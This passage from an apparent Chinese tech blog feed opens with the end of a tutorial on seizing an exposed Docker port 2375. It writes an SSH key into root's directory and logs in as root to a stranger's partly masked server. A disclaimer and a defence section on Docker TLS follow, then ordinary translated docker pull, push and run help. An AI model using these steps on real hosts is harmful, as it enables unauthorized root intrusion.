<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt;ssh-rsa AAA....     # 这里粘贴你刚刚在自己机器生成的/tmp/id_rsa.pub</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">&gt;EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"># 如果/tmp/root/.ssh目录不存在，就直接创建</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>八角香叶生抽老抽醋都加上，中火烹饪，准备出锅~</p>
<h3>step 5: 登入服务器</h3>
<div class="language-ruby line-numbers-mode" data-highlighter="shiki" data-ext="ruby" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-ruby"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ssh -i 指定秘钥登录</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ssh </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">id_rsa root@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">42.96</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">MOSAIC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ssh -i 指定秘钥登录</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">ssh </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">i </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">tmp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">id_rsa root@</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">42.96</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">MOSAIC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># * Documentation:  https://help.ubuntu.com/</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Welcome to aliyun Elastic Compute Service!</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># Last login: Fri Jun  3 01:38:07 2016 from 120.85.MOSAIC.MOSAIC</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># manpath: can't set the locale; make sure $LC_* and $LANG are correct</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># root@iZ28p9b7e***:~# </span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># ...</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>大火收汁，起锅!</p>
<h2>郑重声明</h2>
<p>以上教程仅为交流学习之用，<code>42.96.MOSAIC.MOSAIC</code> 服务器上的<code>id_rsa.pub</code>在制作完本教程后已主动清除，并在服务上留言告知。</p>
<p>如果你一不小心也发现了可用的2375端口，<strong>希望也能点到即止，误做他用</strong>，或者发现其他入侵漏洞，可以和大家交流学习。</p>
<h2>2375是docker漏洞吗？</h2>
<p>非也！<strong>2375直接裸露地暴露在公网上纯属是用户习惯或者偷懒的问题</strong>，<strong>2375可以在相对安全的内部网络中方便测试使用，并不适合使用在投入到生产环境中。</strong></p>
<p>docker官网第一篇文档quick start上有句话是这样子的：</p>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>Warning: Changing the default docker daemon binding to a TCP port or</span></span>
<span class="line"><span>Unix docker user group will increase your security risks by allowing</span></span>
<span class="line"><span>non-root users to gain root access on the host. Make sure you control</span></span>
<span class="line"><span>access to docker. If you are binding to a TCP port, anyone with</span></span>
<span class="line"><span>access to that port has full Docker access; so it is not advisable</span></span>
<span class="line"><span> on an open network.</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>已经Warning告知：如果将daemon直接暴露在一个TCP端口，将可能会被以非root用户去获取宿主机的root权限。其实上面的说提到的服务器之所以这么容器被入侵，也正是这个原因。</p>
<h2>何以防之</h2>
<p>那么，问题来了，如果想用Remote API，又不想有被入侵的风险，怎么办呢？</p>
<p>docker官方文档上介绍了一种通过CA认证方式使用Remote API</p>
<p>具体可以参考：<a href="https://docs.docker.com/engine/security/https/" target="_blank" rel="noopener noreferrer">Protect the Docker daemon socket</a></p>
<p>(等理解了再补一篇博客吧，就姑且让我以一个链接的形式带过吧O.O)</p>
<p>配置过程还算是比较简单的，下面放一张图，展示配置SSL后的效果：</p>
<p></p>
<p>文章知识点与官方知识档案匹配，可进一步学习相关知识</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker的Pull和Push</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%84Pull%E5%92%8CPush.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%84Pull%E5%92%8CPush.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker的Pull和Push</source>
      <description>Docker的Pull和Push docker pull 并发下载 默认情况下，Docker守护程序将一次提取图像的三个层。 如果您使用的是低带宽连接，这可能会导致超时问题，您可能需要降低这个选项 --max-concurrent-downloads daemon 选项.请参阅 daemon documentation 获得更多信息. docker p...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>docker pull</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --help</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Usage:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [OPTIONS] NAME[:TAG|@DIGEST]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  从注册表中拉取镜像或镜像仓库</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">选项：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   -a,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --all-tags</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 下载存储库中所有标记的镜像</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       --disable-content-trust</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 跳过镜像验证（默认为</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       --platform</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 如果服务器支持多平台则设置平台</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   -q,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --quiet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 抑制详细输出</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>并发下载</h3>
<p>默认情况下，Docker守护程序将一次提取图像的三个层。 如果您使用的是低带宽连接，这可能会导致超时问题，您可能需要降低这个选项 <code>--max-concurrent-downloads</code> daemon 选项.请参阅 <a href="https://docs.docker.com/engine/reference/commandline/dockerd/" target="_blank" rel="noopener noreferrer">daemon documentation</a> 获得更多信息.</p>
<h2>docker push</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --help</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">Usage:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> push</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> [OPTIONS] NAME[:TAG]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">将镜像或存储库推送到注册表</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">选项：</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   -a,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --all-tags</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将所有标记的镜像推送到存储库中</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">       --disable-content-trust</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 跳过镜像签名（默认为真）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">   -q,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --quiet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 抑制详细输出</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>并发推送</h3>
<p>默认情况下，Docker守护程序将一次推送图像的五个层。 如果您使用的是低带宽连接，这可能会导致超时问题，您可能需要降低 this via the <code>--max-concurrent-uploads</code> daemon option.请参阅 <a href="https://docs.docker.com/engine/reference/commandline/dockerd/" target="_blank" rel="noopener noreferrer">daemon documentation</a> for more details.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker的run命令所有的选项</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%84run%E5%91%BD%E4%BB%A4%E6%89%80%E6%9C%89%E7%9A%84%E9%80%89%E9%A1%B9.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E7%9A%84run%E5%91%BD%E4%BB%A4%E6%89%80%E6%9C%89%E7%9A%84%E9%80%89%E9%A1%B9.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker的run命令所有的选项</source>
      <description>Docker的run命令所有的选项 如果要看更详细的解释，参考官方文档： https://docs.docker.com/reference/cli/docker/container/run/ docker run --help</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>如果要看更详细的解释，参考官方文档： <a href="https://docs.docker.com/reference/cli/docker/container/run/" target="_blank" rel="noopener noreferrer">https://docs.docker.com/reference/cli/docker/container/run/</a></p>
</blockquote>
<h2>docker run --help</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">--add-host</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 添加自定义主机到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IP</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 映射</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (host:ip)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -a,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --attach</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 附加到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> STDIN、STDOUT</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 或</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> STDERR</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --blkio-weight</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> uint16</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 块</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO（相对权重），介于</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 和</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1000</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 之间，或</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 禁用（默认</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 0）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --blkio-weight-device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Block</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> weight（相对设备权重）（默认[]）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cap-add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 添加</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Linux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 功能</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cap-drop</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 删除</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Linux</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 功能</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cgroup-parent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器的可选父</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cgroupns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 要使用的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间（host</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">private）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                        'host'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">：在</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 主机的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间中运行容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                        'private'</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">：在自己的私有</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间中运行容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">                        ''</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">：使用由守护进程上的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> default-cgroupns-mode</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 选项配置的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 命名空间（默认）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cidfile</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将容器ID写入文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpu-period</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CFS（完全公平调度器）周期</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpu-quota</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CFS（完全公平调度器）配额</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpu-rt-period</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 以微秒为单位限制</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 实时周期</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpu-rt-runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 以微秒为单位限制</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 实时运行时间</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -c,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --cpu-shares</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> int</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 份额（相对权重）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 十进制</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 数量</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpuset-cpus</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 字符串允许执行的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> CPU</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0-3, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0,1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --cpuset-mems</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 允许执行的</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> MEM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (0-3, </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">0,1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -d,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --detach</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 在后台运行容器并打印容器</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ID</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --detach-keys</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 覆盖分离容器的键序列</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将主机设备添加到容器中</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device-cgroup-rule</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 将规则添加到</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 允许的设备列表</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device-read-bps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制设备的读取速率（每秒字节数）（默认</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device-read-iops</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制设备的读取速率（每秒</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO）（默认</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device-write-bps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制设备的写入速率（每秒字节数）（默认</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --device-write-iops</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 限制设备的写入速率（每秒</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IO）（默认</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> []）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --disable-content-trust</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 跳过图像验证（默认为</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">）</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --dns</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设置自定义DNS服务器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --dns-option</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设置DNS选项</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --dns-search</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设置自定义</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> DNS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 搜索域</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --domainname</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 容器</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> NIS</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 域名</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --entrypoint</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> string</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 覆盖图片的默认ENTRYPOINT</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">  -e,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --env</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 设置环境变量</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --env-file</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 读入环境变量文件</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">      --expose</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> list</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 公开一个端口或一系列端口</span></span>
